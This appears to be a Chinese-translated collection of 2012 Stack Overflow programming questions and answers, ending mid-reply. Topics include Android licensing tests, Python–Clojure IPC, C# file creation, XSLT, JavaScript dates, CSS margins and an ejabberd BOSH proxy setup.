> 标签：android, google-play, android-lvl

我有一个 Android 应用程序（使用 PhoneGap 的 HTML5 应用程序），我想用 Android 的 LVL 验证对其进行测试。

我已经从 Eclipse 导出了我的应用程序 pkg，将其上传到 Google Play 而不实际发布它，并将相同的 pkg 安装到我的 Android 手机上。当我去编辑配置文件>设置许可证测试响应时，我选择什么都没关系，手机上的应用程序总是得到“许可”响应。

设备和测试账号都是同一个谷歌账号。

当我附加调试器时，控制台会列出来自 LicenseChecker 的许多日志，

我到底做错了什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-25T14:23:57.837

事实证明 Google Play 应用程序的更新存在错误。许可证检查超时，因此在我的情况下，默认选择是允许用户访问。

[http://code.google.com/p/marketlicensing/issues/detail?can=2&start=0&num=100&q=&colspec=ID%20Type%20Status%20Priority%20Milestone%20Owner%20Summary&groupby=&sort=&id=44](http://code.google.com/p/marketlicensing/issues/detail?can=2&start=0&num=100&q=&colspec=ID%20Type%20Status%20Priority%20Milestone%20Owner%20Summary&groupby=&sort=&id=44)

如果您删除该应用的应用数据，您自己的测试应用将重新建立与 Google Play 的连接，并且您设置的任何测试响应几乎都会立即成为设备上应用收到的响应。

事实上，您甚至不需要遵循关于将完全相同的 pkg 上传到 Google Play 的指南来获得这些测试响应。只需使用相同的密钥。

注意：在我上面的当前设置中，使用 ServerManagedPolicy，应用程序可以很好地区分 LICENSED（触发 Allow()）和 UNLICENSED（触发 DontAllow()）。但是，如果出现错误，则 applicationError() 回调不能很好地处理所有代码，或者其中一些代码永远不会提供给它。

ERROR_NOT_MARKET_MANAGED 触发 ApplicationError() 就好了。但是这两个错误将应用程序重定向到 DontAllow：ERROR_SERVER_FAILURE ERROR_CONTACTING_SERVER

我希望我能抓住这些错误，因为它们通常不是用户的错，但用户却被引导到“你没有购买这个应用程序”对话框。

# python - Clojure 和 Python 程序共享信息的最简单方法是什么？

> ID：11651968
> 
> 赞同：5
> 
> 时间：2012-07-25T14:24:00.677
> 
> 标签：python, clojure, jvm

我有两个问题，一个是另一个的子集。

1) 在 Python 和 Clojure 程序之间传递信息的最佳方式是什么。这个问题也可以扩展到任何 jvm 语言，如 Scala。这些程序将在 Linux 下运行。

2) 在 Windows 下执行此操作的最佳方法是什么？

详细情况如下。我想要一个 Python 程序来启动一个 Clojure 程序，知道 Clojure 程序何时完成，并检索运行 Clojure 程序的结果。

我知道在 Python 和 Clojure 程序之间，信息可以在一个数据库表中共享，该数据库表专门用于在 Clojure 程序完成时存储信息，或者甚至做一些笨拙的事情，比如将结果文件留在已知目录中。

鉴于这是 Linux，我可能可以使用管道共享信息，但我特别想知道是否有 Python 和 Clojure 都支持的模块可以促进程序间通信。

谢谢你。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-25T15:33:08.343

我不确定您的 Clojure 程序在做什么，但如果您只是想从 Python 执行 Clojure 代码，那么 Clojure-Py 可能会有所帮助：

[https://github.com/halgari/clojure-py](https://github.com/halgari/clojure-py)

例如，您可以在 Python 中执行此操作：

```
>>> import clojure.core

>>> clojure.core.cons(1, None)
(1) 
```

免责声明，我是clojure-py的作者

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-26T12:46:43.817

另一种 IPC 方法是使用套接字。我在 python 上创建了一个非常简单的套接字服务器，它接受字符串并在其上调用函数。然后，clojure 实例可以连接到 python 服务器并将 clojure 表单作为数据发送过来。使用**pyclj**，使用**pyclj将 clojure 数据转换为 python 形式，然后对其进行处理，然后使用** **pyclj**`reader`返回 clojure 数据。这种方法对 clojure 更友好，因为您一直在使用 clojure 数据。这也为 python 和 clojure 实例的运行位置提供了更大的灵活性，并为异步通信提供了更好的接口。 **`writer`**

 **[https://github.com/sunng87/pyclj](https://github.com/sunng87/pyclj)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-26T22:36:12.240

If performance is important then [Protocol Buffers](http://code.google.com/p/protobuf) is a good option. Using protobuf from Clojure is covered well in [Protocol Buffers with Clojure and Leiningen](http://oobaloo.co.uk/protocol-buffers-with-clojure-and-leiningen).

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-25T14:35:27.567

我不熟悉 Clojure，但您可能可以使用 python[子进程](http://docs.python.org/library/subprocess.html)模块将 json 传递给它。

```
import json
from subprocess import Popen, PIPE

json_data = json.dumps({"key":"value"})
p = subprocess.Popen("closure-execution", stdout=PIPE, stdin=PIPE, sterr=PIPE)
# stuff some data into the pipe and wait for the process to end:
stdout, sterr = p.communicate(json_data) 
```

或类似的东西...

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-07-26T07:28:01.877

一种选择是使用[Jython](http://www.jython.org/)在与 Clojure 相同的 JVM 中运行您的 Python 代码 - 这样互操作就会变得更加容易。

在这种情况下，互操作也应该是独立于操作系统的，这是一个很好的奖励。

看：

*   [Clojure Jython 互操作](https://stackoverflow.com/questions/2129253/clojure-jython-interop)**

# visual-studio-2010 - 在调试模式下更改值格式

> ID：11651970
> 
> 赞同：0
> 
> 时间：2012-07-25T14:24:06.577
> 
> 标签：visual-studio-2010

当我在 VS 2010 下调试代码时，我看到以下格式的所有值

**0x000003**

如何关闭该格式并查看“正常”值？

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-25T14:31:22.450

右键单击“Locals”或“Autos”视图，然后根据需要打开和关闭“十六进制显示”。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-25T14:31:51.230

查看调试工具栏，有一个名为“Hex”的按钮，尝试单击它。

# javascript - 地理位置Phonegap Android无法正常工作

> ID：11651973
> 
> 赞同：1
> 
> 时间：2012-07-25T14:24:13.130
> 
> 标签：javascript, android, cordova, maps

我已经尽一切努力让我的模拟器（目标 2.2）上的地理定位工作，我使用了 telnet 并发布了“geo fix”，然后是经度和纬度。我已经编辑了我的 Android 清单以授予我权限，但我不确定为什么它不会向我显示以我的位置为中心的谷歌地图。如果我将任何坐标放入地图的 setcentered 函数中，但是当我输入坐标时，它不会显示出来。这是我已经检查了几个小时的代码：

```
<!DOCTYPE html "-//W3C//DTD XHTML 1.0 Strict//
"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
<title>Google Maps JavaScript API Example</title>
<script src="http://maps.google.com/maps?file=api&amp;v=2&amp;key=AIzaSyBrnId8UIeAeDTMr2sVi-g86izgdb2KhVo&sensor=true"
type="text/javascript"></script>
<script type="text/javascript">
// Wait for PhoneGap to load
// PhoneGap is ready
document.addEventListener("deviceready", onDeviceReady, false);
navigator.geolocation.getCurrentPosition(geolocationSuccess, [maximumAge: 3000, timeout:          5000, enableHighAccuracy: 
<!--position.coords.latitude-->
initialize() 
(GBrowserIsCompatible()) 
map = new GMap2(document.getElementById("map_canvas"));
map.setCenter(new GLatLng(position.coords.latitude,position.coords.longitude), 13)
map.setUIToDefault();
// Add 10 markers to the map at random locations
var bounds = map.getBounds();
var southWest = bounds.getSouthWest();
var northEast = bounds.getNorthEast();
var lngSpan = northEast.lng() - southWest.lng();
var latSpan = northEast.lat() - southWest.lat();
}
}      
</script>
</head>
<body onload="initialize()" onunload="GUnload()">
<div id="map_canvas" style="width: 500px; height: 300px"></div>
</body>
</html> 
```

提前谢谢你，我已经尝试解决这个问题了这么多小时，我需要的是谷歌地图出现，谷歌地图的中心是我的位置。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-25T15:53:29.703

这是我的一些快速观察。您似乎没有定义一个 onDeviceReady 函数，该函数将在 PhoneGap 初始化时被调用。下面是 PhoneGap 示例代码的副本，展示了如何使用[PhoneGap 文档中的](http://docs.phonegap.com/en/1.0.0/phonegap_events_events.md.html)onDeviceReady 。

您是否看到这段代码如何定义了一个名为的函数`onDeviceReady`，其中注释说 PhoneGap 方法可以安全调用。

您似乎也没有加载 PhoneGap JavaScript `<script type="text/javascript" charset="utf-8" src="phonegap-1.0.0.js"></script>`。

```
<!DOCTYPE html>
<html>
  <head>
    <title>PhoneGap Device Ready Example</title>

    <script type="text/javascript" charset="utf-8" src="phonegap-1.0.0.js"></script>
    <script type="text/javascript" charset="utf-8">

    // Call onDeviceReady when PhoneGap is loaded.
    //
    // At this point, the document has loaded but phonegap-1.0.0.js has not.
    // When PhoneGap is loaded and talking with the native device,
    // it will call the event `deviceready`.
    // 
    document.addEventListener("deviceready", onDeviceReady, false);

    // PhoneGap is loaded and it is now safe to make calls PhoneGap methods
    //
    function onDeviceReady() {
        // Now safe to use the PhoneGap API
    }

    </script>
  </head>
  <body>
  </body>
</html> 
```

此外，更多地查看您的代码，您没有`GBrowserIsCompatible()`正确使用。您需要在`if`语句中使用此函数调用。

我会改变你的代码如下：

```
<script type="text/javascript" charset="utf-8" src="phonegap-1.0.0.js"></script>
<script type="text/javascript">
    // Wait for PhoneGap to load
    // PhoneGap is ready
    document.addEventListener("deviceready", onDeviceReady, false);
    <!--position.coords.latitude-->
    function onDeviceReady() {
       if (GBrowserIsCompatible()) {
           navigator.geolocation.getCurrentPosition(geolocationSuccess, [maximumAge: 3000, timeout: 5000, enableHighAccuracy: // some code is missing here!
           map = new GMap2(document.getElementById("map_canvas"));
           map.setCenter(new GLatLng(position.coords.latitude,position.coords.longitude), 13)
           map.setUIToDefault();
           // Add 10 markers to the map at random locations
           var bounds = map.getBounds();
           var southWest = bounds.getSouthWest();
           var northEast = bounds.getNorthEast();
           var lngSpan = northEast.lng() - southWest.lng();
           var latSpan = northEast.lat() - southWest.lat();
       } else {
           // add code here to display error that device is not compatible
       }
    }      
</script>
</head>
    <body onunload="GUnload()"> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-26T11:36:52.890

```
/*enter code here*/ function handle_errors(error)
    {
        switch(error.code)
        {
            case error.PERMISSION_DENIED: alert("user did not share geolocation data");
            break;

            case error.POSITION_UNAVAILABLE: alert("could not detect current position");
            break;

            case error.TIMEOUT: alert("retrieving position timedout");
            break;

            default: alert("unknown error");
            break;
        }
    }

    function handle_geolocation_query(position) {  
        var text = "Latitude: "  + position.coords.latitude  + "<br/>" +  
        "Longitude: " + position.coords.longitude + "<br/>" +  
        "Accuracy: "  + position.coords.accuracy  + "m<br/>" +  
        "Time: " + new Date(position.timestamp);  
        //$("#info").html(text); 

        // alert(text);

        var image_url ='';
        image_url = "http://maps.google.com/maps/api/staticmap?path=color:0x0000ff|weight:5|40.737102,-73.990318|40.749825,-73.987963&zoom=14&size=260x300&sensor=true";

        $("#info").slideUp('slow');
        $("#map").slideDown('slow');

        $('#map').html('<img src="'+image_url+'" />');

    } 

/*enter code here*/<a class="request_appoint_ment" href="javascript:void(0);" data-transition="none" id="btnInit">Mark Vehicle Location</a>

/*enter code here*/<div id="info" style="display:none;"><img src="images/ajax-loader.gif" style="padding:50px 0 50px 100px;" /></div>
                    <div id="map" style="display:none; padding-bottom:20px;"></div>

/*enter code here*/$( '#btnInit' ).live( 'click',function(event){
                         $("#map").slideUp('slow');
                         $("#info").slideDown('slow');
                         $('#markmaptype').val(1);
                         initiate_watchlocation();
                         }); 
```

使用此代码，它对我有用

# c# - 我如何尝试创建一个文件，并返回一个指示它是否已创建的值？

> ID：11651974
> 
> 赞同：5
> 
> 时间：2012-07-25T14:24:13.213
> 
> 标签：c#, .net, windows, file-io, .net-4.0

我正在寻找类似于具有这样签名的东西：

```
static bool TryCreateFile(string path); 
```

这需要避免跨线程、进程甚至访问同一文件系统的其他机器之间的潜在竞争条件，而不需要当前用户拥有比他们需要的更多的权限`File.Create`。目前，我有以下代码，我不是特别喜欢：

```
static bool TryCreateFile(string path)
{
    try
    {
        // If we were able to successfully create the file,
        // return true and close it.
        using (File.Open(path, FileMode.CreateNew))
        {
            return true;
        }
    }
    catch (IOException)
    {
        // We want to rethrow the exception if the File.Open call failed
        // for a reason other than that it already existed.
        if (!File.Exists(path))
        {
            throw;
        }
    }

    return false;
} 
```

还有另一种我想念的方法吗？

这适合以下帮助方法，旨在为目录创建“下一个”顺序空文件并返回其路径，再次避免跨线程、进程甚至访问同一文件系统的其他机器之间的潜在竞争条件。所以我想一个有效的解决方案可能涉及不同的方法：

```
static string GetNextFileName(string directoryPath)
{
    while (true)
    {
        IEnumerable<int?> fileNumbers = Directory.EnumerateFiles(directoryPath)
                                                 .Select(int.Parse)
                                                 .Cast<int?>();
        int nextNumber = (fileNumbers.Max() ?? 0) + 1;
        string fileName = Path.Combine(directoryPath, nextNumber.ToString());
        if (TryCreateFile(fileName))
        {
            return fileName;
        }
    }
} 
```

* * *

**Edit1**：我们可以假设在执行此代码时不会从目录中删除文件。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-25T14:34:20.377

不，没有直接的方法也没有办法避免异常处理。

即使您尝试打开现有文件，例如

```
if (File.Exists(fName))
   var s = File.OpenRead(fname); 
```

你仍然可以得到各种异常，包括 FileNotFound。

这是因为您提到的所有原因：

> 跨线程、进程甚至其他机器

但你可能想看看`System.IO.Path.GetRandomFileName()`。我认为他的 i 基于 WinAPI 函数，可让您指定路径等。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-25T14:28:08.883

试试这种方式：

```
 private bool TryCreateFile(string path)
    {
        try
        {
            FileStream fs = File.Create(path);
            fs.Close();
            return true;
        }
        catch 
        {
            return false;
        }
    } 
```

实际上没有办法检查文件是否已创建。没有任何类型的内置功能。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-25T16:56:49.170

这实际上是一个非常复杂的问题。

很难有一个真正的线程安全的方法。在您的`TryCreateFile`中，想象有人在创建文件之后，在您测试之前从另一个进程中删除了该文件`File.Exists`？您的代码会引发异常。

如果您的主要目标是

> 为目录创建“下一个”顺序空文件并返回其路径

，我不会尝试测试文件是否存在。我会假设以 GUID 为名称的文件始终是唯一的：

```
private static void Main(string[] args)
{
    var z = GetNextFileName(@"c:\temp");

    Console.ReadLine();
}

public static string GetNextFileName(string directoryPath)
{
    // Gets file name
    string fileName = Guid.NewGuid().ToString();
    string filePath = Path.Combine(directoryPath, fileName);

    // Creates an empty file
    using (var z = File.Open(filePath, FileMode.CreateNew))
    {
    }

    return filePath;
} 
```

编辑：对于询问 GUID 是否真正唯一的人，请参阅[GUID 是否 100% 的时间都是唯一的？](https://stackoverflow.com/questions/39771/is-a-guid-unique-100-of-the-time)

# iphone - iOS如何在滚动视图上放置阴影

> ID：11651983
> 
> 赞同：0
> 
> 时间：2012-07-25T14:25:06.017
> 
> 标签：iphone, uiscrollview, shadow

在我的 iOS 应用中

我的应用程序包含滚动视图，我想放置一个阴影，我尝试了很多代码，但它们都没有工作..

我以编程方式采取了滚动视图

[self.view addsubview:scroll1];

想使用滑块在滚动视图上设置阴影

所以如果有人知道然后回答它......

```
-(IBAction)slide3changed:(id)sender
{
    UISlider *slider=(UISlider*)sender;

    scroll1.layer.shadowColor = [UIColor blackColor].CGColor;
    scroll1.layer.shadowRadius = slider.value;
    scroll1.layer.shadowOpacity = slider.value;
} 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-07-25T14:49:26.783

你在正确的轨道上，但你需要设置**`masksToBounds`**：

```
-(IBAction)slide3changed:(id)sender
{
    UISlider *slider=(UISlider*)sender;

    scroll1.layer.shadowColor = [UIColor blackColor].CGColor;
    scroll1.layer.shadowRadius = slider.value;
    scroll1.layer.shadowOpacity = slider.value;
    scroll1.layer.masksToBounds = NO; // This is important
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-25T14:46:32.813

我相信您还必须设置偏移量才能开始出现阴影。

```
scroll1.layer.masksToBounds = NO; // this default
scroll1.layer.shadowColor = [[UIColor blackColor] CGColor];
scroll1.layer.shadowOpacity = slider.value;
scroll1.layer.shadowRadius = slider.value;
scroll1.layer.shadowOffset = CGSizeMake(0.0f, 0.0f); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-25T14:42:23.050

首先，你确定你的scrollView的外边缘在superView里面是可见的吗？如果 scrollView 一直到 superView 的边缘，那么阴影将在屏幕外，因此不可见。

shadowOpacity 是一个介于 0.0 到 1.0 之间的浮点值，因此请确保滑块的最小值和最大值分别设置为 0.0 和 1.0。

另外，我不认为你想像你一样改变 shadowRadius。您可能可以不理会该属性，直到您开始工作为止。

您也可以尝试更改 shadowOffset 属性以确保阴影指向您想要的方向。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2015-04-16T13:57:51.543

我想达到同样的效果，这里给定的解决方案对我不起作用。即使用分页的滚动视图虽然嵌套在视图控制器中（第 35、80、250、447 帧），但没有正确呈现。我所做的是在一个简单的 uiview 中添加滚动视图并使用以下代码：

```
self.scrollViewContainer.layer.shadowColor = [UIColor blackColor].CGColor;
self.scrollViewContainer.layer.shadowOpacity = 0.2f;
self.scrollViewContainer.layer.shadowOffset = CGSizeMake(0, 20);
self.scrollViewContainer.layer.shadowRadius = 5;
self.scrollViewContainer.layer.masksToBounds = NO; 
```

# xslt - 使用 XSLT 键入 XML 搜索

> ID：11651985
> 
> 赞同：2
> 
> 时间：2012-07-25T14:25:10.317
> 
> 标签：xslt, xpath

我有 XML 代码：

```
<TestCases>
    <TestCase>
        <TestCaseElement>
            <Name><![CDATA[IP_EXTDEVICE]]></Name>
            <Tags>
                <Tag><![CDATA[Upperlimit]]></Tag>
            </Tags>
            <TaggedValues>
                <TaggedValue key="Upperlimit">
                    <value><![CDATA[4]]></value>
                </TaggedValue>
            </TaggedValues>
        </TestCaseElement>
    </TestCase>
</TestCases> 
```

如何使用 XSLT 选择 V​​alue 4 ？

* * *

```
<xsl:template name="selectOwnTaggedValue">
    <xsl:value-of select="[normalize-space(value)]" />
</xsl:template>
<xsl:template match="/">
    <xsl:for-each select="TestCases/TestCase/TestCaseElement">
        <xsl:apply-templates select="selectOwnTaggedValue[TaggedValues[TaggedValue key="Upperlimit"]" />
    </xsl:for-each>
</xsl:template> 
```

我的 XSL 代码无效，因为我不知道如何在转换中选择值**4**

提前谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-25T14:44:22.347

试试这个...

```
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:output method="text"/>

<xsl:template match="/">
  <xsl:apply-templates select="*/TestCase"/>
</xsl:template>

<xsl:template match="TestCase">
  <xsl:value-of select="concat(
   'The upper limit for ',
  TestCaseElement/Name,
   ' is ',
  TestCaseElement/TaggedValues/TaggedValue[@key='Upperlimit']/value,
  '&#x0A;'
   )"/>
</xsl:template> 
```

* * *

## 更新

针对示例输入运行此样式表的输出是...

```
The upper limit for IP_EXTDEVICE is 4 
```

如果您想要不同的输出，请告诉我。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-25T14:36:37.667

**使用**：

```
/*/TaggedValues/TaggedValue[@key='Upperlimit']/value 
```

这将选择元素。

```
string(/*/TaggedValues/TaggedValue[@key='Upperlimit']/value) 
```

这将生成第一个选定元素的字符串值。

```
/*/TaggedValues/TaggedValue[@key='Upperlimit']/value/text() 
```

这将选择所有选定元素的所有文本节点子节点。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-25T15:30:05.923

我认为保持它的通用性最好用参数调用模板。我想对了吗？

好的，这是我的 XML：

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<TestCases>
<TestCase>
<TestCaseElement>
<Name><![CDATA[IP_EXTDEVICE]]></Name>
        <Tags>
            <Tag><![CDATA[Upperlimit]]></Tag>
            <Tag><![CDATA[Lowerlimit]]></Tag>
        </Tags>
        <TaggedValues>
            <TaggedValue key="Upperlimit">
                <value><![CDATA[4]]></value>
            </TaggedValue>
            <TaggedValue key="Lowerlimit">
                <value><![CDATA[1]]></value>
            </TaggedValue>
        </TaggedValues>

        <Role><![CDATA[TESTSTEP]]></Role>
</TestCaseElement>
<and many more TestCaseElements/>
</TestCase>
</TestCases> 
```

现在我需要在我的输出上限和下限中，最好是在一个通用模板中，所以我现在试试：

```
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
    <xsl:output name="text" method="text" omit-xml-declaration="yes" encoding="ISO-8859-1" />
    <xsl:template name="OwnTaggedValues">
        <xsl:value-of select="TaggedValues/TaggedValue[@key='taggedvalue']/value" />
    </xsl:template>
    <xsl:template match="/">
        <xsl:for-each select="TestCases/TestCase/TestCaseElement[Role = 'TESTSTEP']">
            <xsl:call-template name="OwnTaggedValues">
                </xsl:with-param name="taggedvalue" select="Upperlimit">
            </xsl:call-template>
            <xsl:text>And now the Lowerlimit</xsl:text>
            <xsl:call-template name="OwnTaggedValues">
                </xsl:with-param name="taggedvalue" select="Lowerlimit">
            </xsl:call-template>
        </xsl:for-each>
    </xsl:template>
</xsl:stylesheet> 
```

这确实是我的问题:-)。提前谢谢你肖恩和所有其他人

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-01T07:54:47.637

嗨，我的解决方案现在是：

在 xsl 中：

```
<xsl:template name="Unit" > 
    <xsl:value-of select="TaggedValues/TaggedValue[@key='Unit']/value"/> 
</xsl:template>

<xsl:template name="Precision" > 
    <xsl:value-of select="TaggedValues/TaggedValue[@key='Precision']/value"/> 
</xsl:template>

<xsl:template name="Upperlimit" > 
    <xsl:value-of select="TaggedValues/TaggedValue[@key='Upperlimit']/value"/> 
</xsl:template>

<xsl:template name="Lowerlimit" > 
    <xsl:value-of select="TaggedValues/TaggedValue[@key='Lowerlimit']/value"/> 
</xsl:template> 
```

用

```
<xsl:call-template name="Unit"/> 
```

在这个 xml 上：

```
<TestCaseElement>
        <Name><![CDATA[ini_Alle-Schütze_OFF_V1-0]]></Name>
        <Tags>
            <Tag><![CDATA[Upperlimit]]></Tag>
            <Tag><![CDATA[Precision]]></Tag>
            <Tag><![CDATA[Lowerlimit]]></Tag>
            <Tag><![CDATA[Unit]]></Tag>
        </Tags>

        <TaggedValues>
            <TaggedValue key="Upperlimit">
                <value><![CDATA[1]]></value>
            </TaggedValue>
            <TaggedValue key="Precision">
                <value><![CDATA[0]]></value>
            </TaggedValue>
            <TaggedValue key="Lowerlimit">
                <value><![CDATA[1]]></value>
            </TaggedValue>
            <TaggedValue key="Unit">
                <value><![CDATA[ok]]></value>
            </TaggedValue>
        </TaggedValues>
   </TestCaseElement> 
```

和我想要的输出：

> 是相应值中的值。

谢谢肖恩，您使用@key的解决方案是正确的提示:-)

# javascript - Google Analytics 使用 _setCustomVar 从其他自定义变量创建自定义变量

> ID：11651986
> 
> 赞同：0
> 
> 时间：2012-07-25T14:25:12.313
> 
> 标签：javascript, variables, google-analytics, web-analytics

我正在使用 Google Analytics 设置一些自定义变量`_setCustomVar`。我看过一些使用语法填充自定义变量值的文档（*非官方）。*`P1:P2:P3`我在 Google Developers 文档中找不到确凿的证据表明 的值`P1:P2:P3`将是字符串连接的副本`Golf:Player:Scottish`- 是这样吗？

```
_gaq.push(['_setCustomVar',
3,                          
‘P1',                       
‘Golf’,       
3                        
]);

_gaq.push(['_setCustomVar',
4,                          
‘P2',                       
‘Player’,       
3                        
]);

_gaq.push(['_setCustomVar',
5,                          
‘P3',                       
‘Scottish’,       
3                        
]);

_gaq.push(
['_setAccount', 'UA-123456-1'],
['_setCustomVar', 1, 'Category', 'P1:P2:P3']
); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-26T03:55:20.090

AFAIK 自定义变量名称是任意的，可以是任何名称（在核心语法限制内，例如：128 字符限制等），GA 不提供此类功能。但是，我已经看到某些内容管理和模板系统（或它们的插件）做这种事情，或者原则上类似的事情。但是他们有单独的代码来解析“占位符”值并输出实际值（或保存值的 js 变量），以便将实际值传递给 GA 的 _setCustomVar 方法，而不是占位符值。

不过，如果 GA 实现了这样的东西，那就太好了。我在其他跟踪脚本中看到过这种东西（例如，Omniture 的 SiteCatalyst 有这种东西，他们称之为“动态变量”。SiteCatalyst 还允许您使用处理或 vista 规则在其界面中动态弹出变量）。

所以 GA 实施起来并不难。因此，他们可以将其烘焙到他们的页面编码中和/或在界面中执行（可能添加到他们的过滤器功能中......它已经在原则上对其他东西做了这种事情......）。

# javascript - 如何格式化从 JavaScript 获得的这个日期+时间？(+jsFiddle)

> ID：11651987
> 
> 赞同：0
> 
> 时间：2012-07-25T14:25:12.630
> 
> 标签：javascript, jquery

> **可能重复：**
> [如果我有日期对象，如何在 javascript 中将日期显示为 2/25/2007 格式](https://stackoverflow.com/questions/1536516/how-to-display-a-date-as-2-25-2007-format-in-javascript-if-i-have-date-object)

如何将以下日期+时间格式化为 **2012-07-24 17:00**？

[http://jsfiddle.net/28Tgz/1/](http://jsfiddle.net/28Tgz/1/)

我正在尝试利用

```
formatDate('yy-mm-dd HH:ii', now)); 
```

没有运气。

```
jQuery(document).ready(function() {
var foo = jQuery('#foo');

function updateTime() {
    var now = new Date();
    foo.val(now.toString());        
}

updateTime();
setInterval(updateTime, 5000); // 5 * 1000 miliseconds
}); 
```

这还给我 **2012 年 7 月 25 日星期三 17:14:02 GMT+0300（GTB 夏令时间）**

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-25T14:51:55.860

```
jQuery(document).ready(function() {
    var foo = jQuery('#foo');

    function updateTime() {
        var now = new Date();
        var date = now.getFullYear() + '-' + (now.getMonth() + 1) + '-' + now.getDate() + ' ' + now.getHours() + ':' + now.getMinutes(); 
        foo.val(date);        
    }

    updateTime();
    setInterval(updateTime, 5000); // 5 * 1000 miliseconds
}); 
```

[演示](http://jsfiddle.net/qh9uN/)

`0`如果日期/月/小时/分钟小于 10，您可以填充。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-25T15:06:38.893

这应该完成它：

```
function updateTime() {
    var now = new Date(),
        d = [];

    d[0] = now.getFullYear().toString(),
    d[1] = now.getMonth()+1, //months are 0-based
    d[2] = now.getDate(),
    d[3] = now.getHours(),
    d[4] = now.getMinutes();

    //doing YY manually as getYear() is deprecated
    //remove the next line if you want YYYY instead of YY
    d[0] = d[0].substring(d[0].length-2); //not using substr(-2) as it doesn't work in IE

    //leading zeroes
    for (var i=1; i<=4; i++)
        if (d[i] < 10) d[i] = '0' + d[i];

    foo.val(d[0] + '-' + d[1] + '-' + d[2] + ' ' + d[3] + ':' + d[4]);
} 
```

## **[小提琴](http://jsfiddle.net/ult_combo/28Tgz/61/)**

# *参考*

[MDN Javascript Date Object使用 JavaScript](https://developer.mozilla.org/en/JavaScript/Reference/Global_Objects/Date/)[格式化](https://stackoverflow.com/q/1056728/1331430)
[时间和日期的 10 种方法 在 JavaScript中格式化日期](http://www.webdevelopersnotes.com/tips/html/10_ways_to_format_time_and_date_using_javascript.php3)

# css - 盒子中的 CSS 一致的顶部/底部填充

> ID：11651988
> 
> 赞同：0
> 
> 时间：2012-07-25T14:25:14.683
> 
> 标签：css

无论内容如何，​​我都想创建一个四边间距一致的盒子。

不幸的是，元素有边距，当给盒子填充时会导致问题。这是意料之中的，因为元素的边距不会在填充上“流出”到盒子外面。演示位于[http://jsfiddle.net/cZf7E/1/](http://jsfiddle.net/cZf7E/1/)

到目前为止，我对盒子里的任何东西都有特殊的样式规则，它位于顶部（with `margin-top: 0`）和底部（with `margin-bottom: 0`）。对于顶部来说还不错，但在底部有很多潜在的风格标签。

有没有办法做到这一点，这不是那么 hacky？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-25T14:29:16.367

怎么样

```
aside :first-child {
    margin-top: 0;
}
​aside :last-child {
    margin-bottom: 0;
}​ 
```

第一个/最后一个元素可以是任何类型的元素（`h1`, `h2`, ..., `p`, `div`, `span`）

[**演示**](http://jsfiddle.net/thebabydino/cZf7E/4/)

`aside`请注意，和[**`first-child`**](https://developer.mozilla.org/en/CSS/%3afirst-child)/之间有一个空格[**`last-child`**](https://developer.mozilla.org/en/CSS/%3alast-child)。没有它，样式将适用于 first/last `aside`。

* * *

如果将有更多级别`aside`并且不希望进一步向下传播，则最好使用

```
aside > :first-child {
    margin-top: 0;
}
​aside > :last-child {
    margin-bottom: 0;
}​ 
```

为了只选择`aside`.

[传播与无传播演示](http://jsfiddle.net/thebabydino/cZf7E/5/)（当然，`margin`不适用于内联元素，例如`span`,`em`或`strong`- 它只是为了展示传播的工作原理。）

* * *

**支持**：正如 Ben Dyer 所指出的，`last-child`它是一个[**CSS3 伪类**](http://www.w3.org/TR/css3-selectors/)。IE8 或更早版本不支持它。此外，`first-child`在 IE8 和 7 中存在问题。

# javascript - ejabberd - BOSH 模块未启动

> ID：11651990
> 
> 赞同：1
> 
> 时间：2012-07-25T14:25:15.153
> 
> 标签：javascript, facebook, apache, xmpp, ejabberd

我正在尝试创建自定义 Facebook 聊天，我正在使用：

1.  埃贾伯德
2.  语气
3.  阿帕奇

apache 在一台电脑上，而 ejabberd 在另一台机器上，我使用代理我的请求

```
<Proxy *>
      Order deny,allow
      Deny from all
      Allow from 127.0.0.1
</Proxy>
ProxyPass /http-bind http://my_bosh_domain:5280/http-bind/ nocanon
ProxyPassReverse /http-bind http://my_bosh_domain:5280/http-bind/ 
```

我记录我的请求并收到以下错误：

```
bosh module not started 
```

当我`http://my_bosh_domain:5280/http-bind/`从浏览器中查看时，我可以看到：

```
ejabberd mod_http_bind

An implementation of XMPP over BOSH (XEP-0206)

This web page is only informative. To use HTTP-Bind you need a Jabber/XMPP client that supports it. 
```

我错过了什么？

**更新**

* * *

我已将代理设置更改为：

```
 <Proxy *>
      Order deny,allow
      Allow from all
   </Proxy> 
```

现在我得到以下回复：

```
<body xmlns='http://jabber.org/protocol/httpbind' xmlns:xmpp='urn:xmpp:xbosh'
  xmlns:stream='http://etherx.jabber.org/streams' sid='6093aa55412842f7be3de1b33fd2a307df4ae2fa' wait='60'
